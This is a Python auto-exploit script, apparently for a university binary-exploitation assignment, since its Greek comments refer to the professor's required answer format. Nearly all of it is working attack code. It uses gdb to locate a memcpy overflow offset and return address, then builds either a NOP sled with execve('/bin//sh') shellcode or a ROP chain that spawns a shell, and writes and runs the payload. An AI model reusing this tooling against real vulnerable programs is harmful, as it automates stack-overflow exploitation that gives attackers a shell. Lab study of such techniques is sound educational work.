#!/usr/bin/env python3
import struct, subprocess, sys, os, re

def fx(addr): return struct.pack("<I", addr)

def to_hex_escape(data):
    """Escape all bytes as \\xNN except A which stays as A."""
    result = ""
    for b in data:
        if b == 0x41:
            result += "A"
        else:
            result += f"\\x{b:02x}"
    return result

def run_gdb(binary, commands):
    args = ["gdb", "-q", "--batch"]
    for cmd in commands:
        args += ["--ex", cmd]
    args.append(f"./{binary}")
    return subprocess.run(args, capture_output=True, text=True).stdout

def find_memcpy_bp(binary):
    result = subprocess.run(["objdump", "-d", binary], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if "call" in line and "memcpy" in line:
            m = re.match(r'\s*([0-9a-f]+):', line)
            if m:
                addr = int(m.group(1), 16) + 5
                print(f"[+] memcpy bp: {hex(addr)}")
                return hex(addr)
    print("[!] Using fallback bp 0x80493a2")
    return "0x80493a2"

def find_valid_input(binary):
    for f in ["file1","file2","file3","file4","3.txt","4.txt","5.txt","6.txt"]:
        if os.path.exists(f):
            try:
                r = subprocess.run([f"./{binary}", f], capture_output=True, text=True, timeout=3)
                if "usage" not in r.stderr.lower() and "argument" not in r.stderr.lower():
                    print(f"[+] Input file: {f}")
                    return f
            except subprocess.TimeoutExpired:
                pass
    print("[!] Defaulting to file1")
    return "file1"

def detect_exploit_type(binary, input_file, bp):
    print("[*] Detecting exploit type...")
    out = run_gdb(binary, [
        "set pagination off",
        f"b *{bp}",
        f"r {input_file}",
        "info proc mappings",
        "quit"
    ])
    for line in out.splitlines():
        if "rwxp" in line:
            parts = line.split()
            try:
                addr = int(parts[0], 16)
                end  = int(parts[1], 16)
                if addr < 0x08000000 and (end - addr) <= 0x10000:
                    print(f"[+] Type: ROP (rwx page @ {hex(addr)})")
                    return "rop", addr
            except (ValueError, IndexError):
                pass
    print("[+] Type: Shellcode")
    return "shellcode", None

def find_offset(binary, bp, input_file):
    print("[*] Finding offset...")
    out = run_gdb(binary, [
        "set pagination off",
        f"b *{bp}",
        f"r {input_file}",
        "i r ebp",
        "x/8wx $esp",
        "quit"
    ])
    ebp, esp, buf_start = None, None, None
    for line in out.splitlines():
        m = re.search(r'ebp\s+(0x[0-9a-f]+)', line)
        if m:
            ebp = int(m.group(1), 16)
        m = re.match(r'\s*(0x[0-9a-f]+):\s+(0x[0-9a-f]+)', line)
        if m and esp is None:
            esp = int(m.group(1), 16)
            dst = int(m.group(2), 16)
            if 0xbf000000 <= dst <= 0xc0000000:
                buf_start = dst
            else:
                buf_start = esp + 0x18
    if ebp and buf_start:
        offset = (ebp + 4) - buf_start
        if 0 < offset < 500:
            print(f"[+] offset={offset}  buf={hex(buf_start)}  ebp={hex(ebp)}")
            return offset, buf_start
        else:
            buf_start = esp + 0x18
            offset = (ebp + 4) - buf_start
            print(f"[+] fallback offset={offset}")
            return offset, buf_start
    print("[!] Defaulting to 52")
    return 52, buf_start

# ── SHELLCODE ─────────────────────────────────
SHELLCODE = bytes([
    0x31,0xc0,
    0x50,
    0x68,0x2f,0x2f,0x73,0x68,
    0x68,0x2f,0x62,0x69,0x6e,
    0x89,0xe3,
    0x31,0xc9,
    0x31,0xd2,
    0xb0,0x0b,
    0xcd,0x80
])
NOP_SLED = b"\x90" * 16

def find_ret_addr(binary, bp, input_file, buf_start):
    print("[*] Finding return address...")
    out = run_gdb(binary, [
        "set pagination off",
        f"b *{bp}",
        f"r {input_file}",
        "x/4wx $esp",
        "quit"
    ])
    for line in out.splitlines():
        m = re.match(r'\s*(0x[0-9a-f]+):\s+(0x[0-9a-f]+)', line)
        if m:
            dst = int(m.group(2), 16)
            if 0xbf000000 <= dst <= 0xc0000000:
                ret = dst + 8
                print(f"[+] ret_addr={hex(ret)}")
                return ret
    ret = (buf_start or 0xbfffcb38) + 8
    print(f"[+] ret_addr={hex(ret)} (fallback)")
    return ret

def build_shellcode_payload(offset, ret_addr):
    sc      = NOP_SLED + SHELLCODE
    pad_len = offset - len(sc)
    if pad_len < 0:
        sc      = SHELLCODE
        pad_len = offset - len(sc)
    payload = sc + b"A" * pad_len + fx(ret_addr)
    print(f"[+] nop+sc={len(sc)}  pad={pad_len}  ret={hex(ret_addr)}")
    return payload

# ── ROP ───────────────────────────────────────
def dump_rwx_page(binary, bp, input_file, rwx_base):
    print(f"[*] Dumping rwx page @ {hex(rwx_base)}...")
    out = run_gdb(binary, [
        "set pagination off",
        f"b *{bp}",
        f"r {input_file}",
        f"x/4096xb {hex(rwx_base)}",
        "quit"
    ])
    raw = {}
    for line in out.splitlines():
        m = re.match(r'\s*(0x[0-9a-f]+):\s+(.*)', line)
        if m:
            addr = int(m.group(1), 16)
            for i, b in enumerate(m.group(2).split()):
                try: raw[addr + i] = int(b, 16)
                except ValueError: pass
    print(f"[+] {len(raw)} bytes dumped")
    return raw

def find_gadgets(raw):
    print("[*] Scanning gadgets...")
    targets = [
        ("pop eax; pop ebx; ret", [0x58, 0x5b, 0xc3]),
        ("xor eax, eax; ret",     [0x31, 0xc0, 0xc3]),
        ("mov [ebx], eax; ret",   [0x89, 0x03, 0xc3]),
        ("xor ecx, ecx; ret",     [0x31, 0xc9, 0xc3]),
        ("xor edx, edx; ret",     [0x31, 0xd2, 0xc3]),
        ("mov al, 0x0b; ret",     [0xb0, 0x0b, 0xc3]),
        ("int 0x80; ret",         [0xcd, 0x80, 0xc3]),
        ("int 0x80",              [0xcd, 0x80]),
    ]
    found = {}
    for addr in sorted(raw.keys()):
        window = [raw.get(addr+i, -1) for i in range(6)]
        for name, sig in targets:
            if name in found: continue
            if name == "int 0x80" and "int 0x80; ret" in found: continue
            if window[:len(sig)] == sig:
                found[name] = addr
                print(f"[+] {name:35s} @ {hex(addr)}")
    if "int 0x80; ret" not in found and "int 0x80" in found:
        found["int 0x80; ret"] = found["int 0x80"]
    missing = [t[0] for t in targets[:7] if t[0] not in found]
    if missing:
        print(f"[-] Missing gadgets: {missing}")
        sys.exit(1)
    return found

def find_data_addr(binary):
    print("[*] Finding .data address...")
    for cmd in [["readelf","-S",binary], ["objdump","-h",binary]]:
        r = subprocess.run(cmd, capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if ".data" in line and ("WA" in line or "DATA" in line):
                for p in line.split():
                    try:
                        addr = int(p, 16)
                        if 0x08040000 < addr < 0x08200000:
                            print(f"[+] data addr: {hex(addr+0x40)}")
                            return addr + 0x40
                    except ValueError: pass
    print("[!] Defaulting to 0x0804c080")
    return 0x0804c080

def build_rop_payload(gadgets, data_addr, offset):
    print("[*] Building ROP chain...")
    g1=gadgets["pop eax; pop ebx; ret"]
    g2=gadgets["xor eax, eax; ret"]
    g3=gadgets["mov [ebx], eax; ret"]
    g5=gadgets["xor ecx, ecx; ret"]
    g6=gadgets["xor edx, edx; ret"]
    g7=gadgets["mov al, 0x0b; ret"]
    g8=gadgets["int 0x80; ret"]
    rop = [
        fx(g1), b"/bin", fx(data_addr),     fx(g3),
        fx(g1), b"//sh", fx(data_addr+4),   fx(g3),
        fx(g1), b"AAAA", fx(data_addr+8),
        fx(g2), fx(g3),
        fx(g5), fx(g6),
        fx(g1), fx(0), fx(data_addr),
        fx(g7), fx(g8),
    ]
    payload = b"A"*offset + b"".join(rop)
    print(f"[+] padding={offset}  rop={len(b''.join(rop))}  total={len(payload)}")
    return payload

# ── OUTPUT ────────────────────────────────────
def format_answer(payload, outfile):
    size = len(payload)
    # Μετατρέπουμε ΟΛΟ το payload σε \xNN μορφή
    hex_payload = "".join(f"\\x{b:02x}" for b in payload)
    
    # Κατασκευή της εντολής printf που θέλει ο καθηγητής
    cmd = f'printf "{size} {hex_payload}" > {outfile}'
    
    print()
    print("=" * 60)
    print("  ANSWER FOR THE PROFESSOR (Run this in your terminal)")
    print("=" * 60)
    print(cmd)
    print("=" * 60)
    print()

def write_solution(payload, outfile):
    data = str(len(payload)).encode() + b" " + payload
    with open(outfile, "wb") as f:
        f.write(data)
    print(f"[+] Written '{outfile}' ({len(data)} bytes)")

# ── MAIN ──────────────────────────────────────
def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <binary> [outfile] [run_script]")
        sys.exit(1)

    binary     = sys.argv[1].lstrip("./")
    run_script = sys.argv[3] if len(sys.argv) > 3 else "./run.sh"
    num        = re.search(r'\d+', binary)
    default_out= f"file{num.group()}" if num else "file_solution"
    outfile    = sys.argv[2] if len(sys.argv) > 2 else default_out

    if not os.path.exists(f"./{binary}"):
        print(f"[-] '{binary}' not found.")
        sys.exit(1)

    print("=" * 60)
    print(f"  Auto-Exploit  |  {binary}  ->  {outfile}")
    print("=" * 60)

    bp         = find_memcpy_bp(binary)
    input_file = find_valid_input(binary)
    etype, rwx = detect_exploit_type(binary, input_file, bp)
    offset, buf= find_offset(binary, bp, input_file)

    if etype == "shellcode":
        ret     = find_ret_addr(binary, bp, input_file, buf)
        payload = build_shellcode_payload(offset, ret)
    else:
        raw      = dump_rwx_page(binary, bp, input_file, rwx)
        gadgets  = find_gadgets(raw)
        data_addr= find_data_addr(binary)
        payload  = build_rop_payload(gadgets, data_addr, offset)

    write_solution(payload, outfile)
    format_answer(payload, outfile)

    print("[*] Running exploit...")
    print("Savvas is the fcking Best!!")
    os.execv("/bin/sh", ["/bin/sh", run_script, f"./{binary}", outfile])
    

if __name__ == "__main__":
    main()
